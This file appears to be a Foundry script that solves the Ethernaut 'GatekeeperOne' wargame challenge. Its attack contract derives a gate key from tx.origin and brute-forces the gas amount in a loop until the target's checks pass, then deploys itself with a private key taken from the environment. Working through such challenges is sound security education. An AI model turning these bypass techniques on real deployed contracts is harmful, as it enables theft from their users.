// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract GateKeeperAttack {
    GatekeeperOne gatekeeper = GatekeeperOne(0xa779378a76e88294E8D64B06341b6D6077B48fa9);

    constructor() {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for(uint256 i = 0; i < 120; i++){
          (bool result ,) = address(gatekeeper).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

          if(result){
            break;
            }
        }
    }

}
contract GateKeeperOneSolution is Script {

    function run() external {
        // 1 send from contract
        // 2 Specify gas
        // 3 cast msg.sender
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GateKeeperAttack();
        vm.stopBroadcast();
    }
}